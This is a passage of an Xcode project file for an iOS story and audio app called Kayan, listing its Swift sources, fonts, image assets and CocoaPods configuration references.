// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 52;
	objects = {

/* Begin PBXBuildFile section */
		B145D56C26148B8F00FAFAA1 /* StoriesSection.swift in Sources */ = {isa = PBXBuildFile; fileRef = B145D56B26148B8F00FAFAA1 /* StoriesSection.swift */; };
		B1596A7E2612F26C00D06B1A /* SplashScreen.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1596A7D2612F26C00D06B1A /* SplashScreen.swift */; };
		B1596A842612F4DD00D06B1A /* StoriesCards.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1596A832612F4DD00D06B1A /* StoriesCards.swift */; };
		B1596A882612F72000D06B1A /* Home.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1596A872612F72000D06B1A /* Home.swift */; };
		B1596A8D26130B9F00D06B1A /* SwiftUIX in Frameworks */ = {isa = PBXBuildFile; productRef = B1596A8C26130B9F00D06B1A /* SwiftUIX */; };
		B1596A9126130BFF00D06B1A /* AppIntro.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1596A9026130BFF00D06B1A /* AppIntro.swift */; };
		B15B0AF6261B161C009A591C /* Gift.swift in Sources */ = {isa = PBXBuildFile; fileRef = B15B0AF5261B161C009A591C /* Gift.swift */; };
		B1678AE02615A96D001B0A9C /* Navbars.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1678ADF2615A96D001B0A9C /* Navbars.swift */; };
		B1678AE92615B462001B0A9C /* RoundedCorner.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1678AE82615B462001B0A9C /* RoundedCorner.swift */; };
		B1678AED2615F73D001B0A9C /* SignUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1678AEC2615F73D001B0A9C /* SignUp.swift */; };
		B1678AF126160505001B0A9C /* ColorExt.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1678AF026160505001B0A9C /* ColorExt.swift */; };
		B1713F2F2611C6BD00BCCCEE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1713F2E2611C6BD00BCCCEE /* AppDelegate.swift */; };
		B1713F312611C6BD00BCCCEE /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1713F302611C6BD00BCCCEE /* SceneDelegate.swift */; };
		B1713F332611C6BD00BCCCEE /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1713F322611C6BD00BCCCEE /* ContentView.swift */; };
		B1713F352611C6C000BCCCEE /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B1713F342611C6C000BCCCEE /* Assets.xcassets */; };
		B1713F382611C6C000BCCCEE /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B1713F372611C6C000BCCCEE /* Preview Assets.xcassets */; };
		B1713F3B2611C6C000BCCCEE /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B1713F392611C6C000BCCCEE /* LaunchScreen.storyboard */; };
		B1811D3426130E4E0021E0A0 /* SignIn.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1811D3326130E4E0021E0A0 /* SignIn.swift */; };
		B1811D382613314F0021E0A0 /* TextVIewStyle.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1811D372613314F0021E0A0 /* TextVIewStyle.swift */; };
		B1995B97261C43D400BA4225 /* AccountSetting.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1995B96261C43D400BA4225 /* AccountSetting.swift */; };
		B1E27D822612712E00012D4B /* StoryPage.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1E27D812612712E00012D4B /* StoryPage.swift */; };
		F5ACC012A1739835AE818BF3 /* Pods_Kayan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 20CDEB6430A0480524A8DAEA /* Pods_Kayan.framework */; };
		FA01781226820FE1001D6873 /* Sukar black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = FA01781126820FE1001D6873 /* Sukar black.ttf */; };
		FA01781426821223001D6873 /* Jozoor Font.otf in Resources */ = {isa = PBXBuildFile; fileRef = FA01781326821223001D6873 /* Jozoor Font.otf */; };
		FA0220D32638CD9F0088C93A /* RestAPI.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA0220D22638CD9F0088C93A /* RestAPI.swift */; };
		FA0220DB2638CE9C0088C93A /* Connection.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA0220DA2638CE9C0088C93A /* Connection.swift */; };
		FA0220DF2638D1B80088C93A /* TextBindingManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA0220DE2638D1B80088C93A /* TextBindingManager.swift */; };
		FA0220E32638D29D0088C93A /* VarUserDefault.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA0220E22638D29D0088C93A /* VarUserDefault.swift */; };
		FA0E93D2267F951D0075DCA4 /* TestViewsSandaScroolV3.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA0E93D1267F951D0075DCA4 /* TestViewsSandaScroolV3.swift */; };
		FA1185A1267E409500359713 /* TestCarusel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA1185A0267E409500359713 /* TestCarusel.swift */; };
		FA1185A3267E465C00359713 /* SandalStoryV2View.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA1185A2267E465C00359713 /* SandalStoryV2View.swift */; };
		FA118C5D2688AF2100DCFCD6 /* Cairo-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = FA118C5C2688AF2100DCFCD6 /* Cairo-Black.ttf */; };
		FA118C5F2688B4C900DCFCD6 /* Cairo-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = FA118C5E2688B4C900DCFCD6 /* Cairo-Regular.ttf */; };
		FA118C622688B50700DCFCD6 /* customFount.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA118C612688B50700DCFCD6 /* customFount.swift */; };
		FA1FF0F02648725F00233FFF /* BackButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA1FF0EF2648725F00233FFF /* BackButton.swift */; };
		FA1FF0F32648752400233FFF /* StoriesModal.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA1FF0F22648752400233FFF /* StoriesModal.swift */; };
		FA24110B265656D20072B741 /* AsyncImage.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA24110A265656D20072B741 /* AsyncImage.swift */; };
		FA24110D265657070072B741 /* ImageLoader.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA24110C265657070072B741 /* ImageLoader.swift */; };
		FA24110F2656573D0072B741 /* TemporaryImageCache.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA24110E2656573D0072B741 /* TemporaryImageCache.swift */; };
		FA2411112656581C0072B741 /* ImageCacheKey.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA2411102656581C0072B741 /* ImageCacheKey.swift */; };
		FA241113265664CE0072B741 /* StroryModal.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA241112265664CE0072B741 /* StroryModal.swift */; };
		FA241115265665CF0072B741 /* StoryCards.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA241114265665CF0072B741 /* StoryCards.swift */; };
		FA2411172656680A0072B741 /* Stories.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA2411162656680A0072B741 /* Stories.swift */; };
		FA27594E26CA6020002C2F7A /* SignalRService.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA27594D26CA6020002C2F7A /* SignalRService.swift */; };
		FA27595026CCFBCE002C2F7A /* StopTimerManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA27594F26CCFBCE002C2F7A /* StopTimerManager.swift */; };
		FA27595426CD42FD002C2F7A /* ComingSoon.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA27595326CD42FD002C2F7A /* ComingSoon.swift */; };
		FA27595626CD46CC002C2F7A /* ComingSoon_Card_Cards.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA27595526CD46CC002C2F7A /* ComingSoon_Card_Cards.swift */; };
		FA2C630D265D2AA000EE341D /* Favorate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA2C630C265D2AA000EE341D /* Favorate.swift */; };
		FA2C630F265D310F00EE341D /* VaforaiteCard.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA2C630E265D310F00EE341D /* VaforaiteCard.swift */; };
		FA308A762634D8230055DF88 /* ForgetPassword.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA308A752634D8230055DF88 /* ForgetPassword.swift */; };
		FA308A792634DBD40055DF88 /* VarificationCode.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA308A782634DBD40055DF88 /* VarificationCode.swift */; };
		FA31376C26C8FCC1007E690C /* StoriesTail.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA31376B26C8FCC1007E690C /* StoriesTail.swift */; };
		FA4218CD2663C077001FEA19 /* QueestionPage.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4218CC2663C077001FEA19 /* QueestionPage.swift */; };
		FA4BB6C5265E88580064419A /* Story_group_section.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4BB6C4265E88580064419A /* Story_group_section.swift */; };
		FA4BB6C7265EB59A0064419A /* ClibModal.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4BB6C6265EB59A0064419A /* ClibModal.swift */; };
		FA4BB6C9265EB7110064419A /* clips_group_section.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4BB6C8265EB7110064419A /* clips_group_section.swift */; };
		FA4BB6CC265EB9C00064419A /* Play_Relacsation.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4BB6CB265EB9C00064419A /* Play_Relacsation.swift */; };
		FA4F549E26C53BA200E48AB6 /* payment_WebView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4F549D26C53BA200E48AB6 /* payment_WebView.swift */; };
		FA4F54A026C53BC000E48AB6 /* WebViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4F549F26C53BC000E48AB6 /* WebViewModel.swift */; };
		FA56296D26C16F6B00291727 /* Kyan.gif in Resources */ = {isa = PBXBuildFile; fileRef = FA56296C26C16F6B00291727 /* Kyan.gif */; };
		FA56296F26C1736300291727 /* LoadinIndicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA56296E26C1736300291727 /* LoadinIndicator.swift */; };
		FA83A73226564B69002F814E /* SamopleRecourding.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA83A73126564B69002F814E /* SamopleRecourding.swift */; };
		FA83A73426564BB1002F814E /* AudioRecorder.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA83A73326564BB1002F814E /* AudioRecorder.swift */; };
		FA83A73626564C08002F814E /* DateExtention.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA83A73526564C08002F814E /* DateExtention.swift */; };
		FA83A73826564C4C002F814E /* RecordingDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA83A73726564C4C002F814E /* RecordingDataModel.swift */; };
		FA83A73B26564CD3002F814E /* HelperFunction.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA83A73A26564CD3002F814E /* HelperFunction.swift */; };
		FA83A73D26564D07002F814E /* RecordingsList.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA83A73C26564D07002F814E /* RecordingsList.swift */; };
		FA83A73F26564DB2002F814E /* AudioPlayer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA83A73E26564DB2002F814E /* AudioPlayer.swift */; };
		FA963A4F267E1CF300CAAEFF /* CustomScrollViewLoadingButtom.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA963A4E267E1CF300CAAEFF /* CustomScrollViewLoadingButtom.swift */; };
		FA963A51267E22E400CAAEFF /* TestScroolView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA963A50267E22E400CAAEFF /* TestScroolView.swift */; };
		FA9AD0702659339700E9A221 /* Story_Page_Modal.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA9AD06F2659339700E9A221 /* Story_Page_Modal.swift */; };
		FAAD330726C2879C00BCE7AA /* kayan_gif.gif in Resources */ = {isa = PBXBuildFile; fileRef = FAAD330626C2879C00BCE7AA /* kayan_gif.gif */; };
		FAB555192666687900B5DACD /* Setting.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAB555182666687900B5DACD /* Setting.swift */; };
		FAB56379265A8CBE009C7D55 /* stories_table.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAB56378265A8CBE009C7D55 /* stories_table.swift */; };
		FAC5EEE126848C4300BF39E1 /* StoryViewV4.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAC5EEE026848C4300BF39E1 /* StoryViewV4.swift */; };
		FAD34F5726764C1A006C73C7 /* IntroVedio.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAD34F5626764C1A006C73C7 /* IntroVedio.swift */; };
		FADD264C264752580060BA3D /* MenueModal.swift in Sources */ = {isa = PBXBuildFile; fileRef = FADD264B264752580060BA3D /* MenueModal.swift */; };
		FADE881A26C3BBEA00536ED3 /* Rate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FADE881926C3BBEA00536ED3 /* Rate.swift */; };
		FADE881C26C3C38500536ED3 /* RatingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FADE881B26C3C38500536ED3 /* RatingView.swift */; };
		FADE881F26C4080B00536ED3 /* Pay_story.swift in Sources */ = {isa = PBXBuildFile; fileRef = FADE881E26C4080B00536ED3 /* Pay_story.swift */; };
		FAE819DF26678E4B0035C01D /* ScreenEx.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAE819DE26678E4B0035C01D /* ScreenEx.swift */; };
		FAE81A1A2667BC1F0035C01D /* ResetPassword.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAE81A192667BC1F0035C01D /* ResetPassword.swift */; };
		FAE81A1C2667C5BF0035C01D /* ValidationMessage.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAE81A1B2667C5BF0035C01D /* ValidationMessage.swift */; };
		FAEDF90B263B38B300D9593F /* UserSignUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAEDF90A263B38B300D9593F /* UserSignUp.swift */; };
		FAEDF90F263B3C5F00D9593F /* SendVarificationCode.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAEDF90E263B3C5F00D9593F /* SendVarificationCode.swift */; };
		FAEDF914263B3DA200D9593F /* sandalLoadingIndicater.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAEDF913263B3DA200D9593F /* sandalLoadingIndicater.swift */; };
		FAEEEA0726877A8700B944A6 /* PlayAppSound.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAEEEA0626877A8700B944A6 /* PlayAppSound.swift */; };
		FAF271B726CE4C0900F75AEB /* GiftStory.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAF271B626CE4C0900F75AEB /* GiftStory.swift */; };
		FAF271B926CE4E5100F75AEB /* Gift_Stories_Card.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAF271B826CE4E5100F75AEB /* Gift_Stories_Card.swift */; };
		FAF41168263F63730056EF70 /* HideKeyboard.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAF41167263F63730056EF70 /* HideKeyboard.swift */; };
		FAF8829B26776F8900C492FC /* ShareSheet.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAF8829A26776F8900C492FC /* ShareSheet.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		0168A6A5D3AF86E9E7A9BAFD /* Pods-Kayan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Kayan.debug.xcconfig"; path = "Target Support Files/Pods-Kayan/Pods-Kayan.debug.xcconfig"; sourceTree = "<group>"; };
		20CDEB6430A0480524A8DAEA /* Pods_Kayan.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Kayan.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		A8FBDF7F3C56B4C2A84E61F0 /* Pods-Kayan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Kayan.release.xcconfig"; path = "Target Support Files/Pods-Kayan/Pods-Kayan.release.xcconfig"; sourceTree = "<group>"; };
		B145D56B26148B8F00FAFAA1 /* StoriesSection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoriesSection.swift; sourceTree = "<group>"; };
		B1596A7D2612F26C00D06B1A /* SplashScreen.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SplashScreen.swift; sourceTree = "<group>"; };
		B1596A832612F4DD00D06B1A /* StoriesCards.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoriesCards.swift; sourceTree = "<group>"; };
		B1596A872612F72000D06B1A /* Home.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Home.swift; sourceTree = "<group>"; };
		B1596A9026130BFF00D06B1A /* AppIntro.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppIntro.swift; sourceTree = "<group>"; };
		B15B0AF5261B161C009A591C /* Gift.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Gift.swift; sourceTree = "<group>"; };
		B1678ADF2615A96D001B0A9C /* Navbars.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Navbars.swift; sourceTree = "<group>"; };
		B1678AE82615B462001B0A9C /* RoundedCorner.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RoundedCorner.swift; sourceTree = "<group>"; };
		B1678AEC2615F73D001B0A9C /* SignUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUp.swift; sourceTree = "<group>"; };
		B1678AF026160505001B0A9C /* ColorExt.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ColorExt.swift; sourceTree = "<group>"; };
		B1713F2B2611C6BD00BCCCEE /* Kayan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Kayan.app; sourceTree = BUILT_PRODUCTS_DIR; };
		B1713F2E2611C6BD00BCCCEE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		B1713F302611C6BD00BCCCEE /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		B1713F322611C6BD00BCCCEE /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		B1713F342611C6C000BCCCEE /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		B1713F372611C6C000BCCCEE /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		B1713F3A2611C6C000BCCCEE /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		B1713F3C2611C6C000BCCCEE /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		B1811D3326130E4E0021E0A0 /* SignIn.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignIn.swift; sourceTree = "<group>"; };
		B1811D372613314F0021E0A0 /* TextVIewStyle.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextVIewStyle.swift; sourceTree = "<group>"; };
		B1995B96261C43D400BA4225 /* AccountSetting.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountSetting.swift; sourceTree = "<group>"; };
		B1E27D812612712E00012D4B /* StoryPage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoryPage.swift; sourceTree = "<group>"; };
		FA01781126820FE1001D6873 /* Sukar black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Sukar black.ttf"; sourceTree = "<group>"; };
		FA01781326821223001D6873 /* Jozoor Font.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Jozoor Font.otf"; sourceTree = "<group>"; };
		FA0220D22638CD9F0088C93A /* RestAPI.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RestAPI.swift; sourceTree = "<group>"; };
		FA0220DA2638CE9C0088C93A /* Connection.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Connection.swift; sourceTree = "<group>"; };
		FA0220DE2638D1B80088C93A /* TextBindingManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextBindingManager.swift; sourceTree = "<group>"; };
		FA0220E22638D29D0088C93A /* VarUserDefault.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = VarUserDefault.swift; sourceTree = "<group>"; };
		FA0E93D1267F951D0075DCA4 /* TestViewsSandaScroolV3.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestViewsSandaScroolV3.swift; sourceTree = "<group>"; };
		FA1185A0267E409500359713 /* TestCarusel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestCarusel.swift; sourceTree = "<group>"; };
		FA1185A2267E465C00359713 /* SandalStoryV2View.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SandalStoryV2View.swift; sourceTree = "<group>"; };
		FA118C5C2688AF2100DCFCD6 /* Cairo-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Cairo-Black.ttf"; sourceTree = "<group>"; };
		FA118C5E2688B4C900DCFCD6 /* Cairo-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Cairo-Regular.ttf"; sourceTree = "<group>"; };
		FA118C612688B50700DCFCD6 /* customFount.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = customFount.swift; sourceTree = "<group>"; };
		FA1FF0EF2648725F00233FFF /* BackButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BackButton.swift; sourceTree = "<group>"; };
		FA1FF0F22648752400233FFF /* StoriesModal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoriesModal.swift; sourceTree = "<group>"; };
		FA24110A265656D20072B741 /* AsyncImage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AsyncImage.swift; sourceTree = "<group>"; };
		FA24110C265657070072B741 /* ImageLoader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageLoader.swift; sourceTree = "<group>"; };
		FA24110E2656573D0072B741 /* TemporaryImageCache.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TemporaryImageCache.swift; sourceTree = "<group>"; };
		FA2411102656581C0072B741 /* ImageCacheKey.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageCacheKey.swift; sourceTree = "<group>"; };
		FA241112265664CE0072B741 /* StroryModal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StroryModal.swift; sourceTree = "<group>"; };
		FA241114265665CF0072B741 /* StoryCards.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoryCards.swift; sourceTree = "<group>"; };
		FA2411162656680A0072B741 /* Stories.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Stories.swift; sourceTree = "<group>"; };
		FA27594D26CA6020002C2F7A /* SignalRService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignalRService.swift; sourceTree = "<group>"; };
		FA27594F26CCFBCE002C2F7A /* StopTimerManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StopTimerManager.swift; sourceTree = "<group>"; };
		FA27595326CD42FD002C2F7A /* ComingSoon.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ComingSoon.swift; sourceTree = "<group>"; };
		FA27595526CD46CC002C2F7A /* ComingSoon_Card_Cards.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ComingSoon_Card_Cards.swift; sourceTree = "<group>"; };
		FA2C630C265D2AA000EE341D /* Favorate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Favorate.swift; sourceTree = "<group>"; };
		FA2C630E265D310F00EE341D /* VaforaiteCard.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VaforaiteCard.swift; sourceTree = "<group>"; };
		FA308A752634D8230055DF88 /* ForgetPassword.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgetPassword.swift; sourceTree = "<group>"; };
		FA308A782634DBD40055DF88 /* VarificationCode.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VarificationCode.swift; sourceTree = "<group>"; };
		FA31376B26C8FCC1007E690C /* StoriesTail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoriesTail.swift; sourceTree = "<group>"; };
		FA4218CC2663C077001FEA19 /* QueestionPage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QueestionPage.swift; sourceTree = "<group>"; };
		FA4BB6C4265E88580064419A /* Story_group_section.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Story_group_section.swift; sourceTree = "<group>"; };
		FA4BB6C6265EB59A0064419A /* ClibModal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClibModal.swift; sourceTree = "<group>"; };
		FA4BB6C8265EB7110064419A /* clips_group_section.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = clips_group_section.swift; sourceTree = "<group>"; };
		FA4BB6CB265EB9C00064419A /* Play_Relacsation.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Play_Relacsation.swift; sourceTree = "<group>"; };
		FA4F549D26C53BA200E48AB6 /* payment_WebView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = payment_WebView.swift; sourceTree = "<group>"; };
		FA4F549F26C53BC000E48AB6 /* WebViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebViewModel.swift; sourceTree = "<group>"; };
		FA56296C26C16F6B00291727 /* Kyan.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; name = Kyan.gif; path = Assets.xcassets/Logos/Kayan_loader/Kyan_loader.dataset/Kyan.gif; sourceTree = "<group>"; };
		FA56296E26C1736300291727 /* LoadinIndicator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadinIndicator.swift; sourceTree = "<group>"; };
		FA83A73126564B69002F814E /* SamopleRecourding.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SamopleRecourding.swift; sourceTree = "<group>"; };
		FA83A73326564BB1002F814E /* AudioRecorder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AudioRecorder.swift; sourceTree = "<group>"; };
		FA83A73526564C08002F814E /* DateExtention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateExtention.swift; sourceTree = "<group>"; };
		FA83A73726564C4C002F814E /* RecordingDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecordingDataModel.swift; sourceTree = "<group>"; };
		FA83A73A26564CD3002F814E /* HelperFunction.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HelperFunction.swift; sourceTree = "<group>"; };
		FA83A73C26564D07002F814E /* RecordingsList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecordingsList.swift; sourceTree = "<group>"; };
		FA83A73E26564DB2002F814E /* AudioPlayer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AudioPlayer.swift; sourceTree = "<group>"; };
		FA963A4E267E1CF300CAAEFF /* CustomScrollViewLoadingButtom.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomScrollViewLoadingButtom.swift; sourceTree = "<group>"; };
		FA963A50267E22E400CAAEFF /* TestScroolView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestScroolView.swift; sourceTree = "<group>"; };
		FA9AD06F2659339700E9A221 /* Story_Page_Modal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Story_Page_Modal.swift; sourceTree = "<group>"; };
		FAAD330626C2879C00BCE7AA /* kayan_gif.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = kayan_gif.gif; sourceTree = "<group>"; };
		FAB555182666687900B5DACD /* Setting.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Setting.swift; sourceTree = "<group>"; };
		FAB56378265A8CBE009C7D55 /* stories_table.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = stories_table.swift; sourceTree = "<group>"; };
		FAC5EEE026848C4300BF39E1 /* StoryViewV4.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoryViewV4.swift; sourceTree = "<group>"; };
		FAD34F5626764C1A006C73C7 /* IntroVedio.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IntroVedio.swift; sourceTree = "<group>"; };
		FADD264B264752580060BA3D /* MenueModal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MenueModal.swift; sourceTree = "<group>"; };
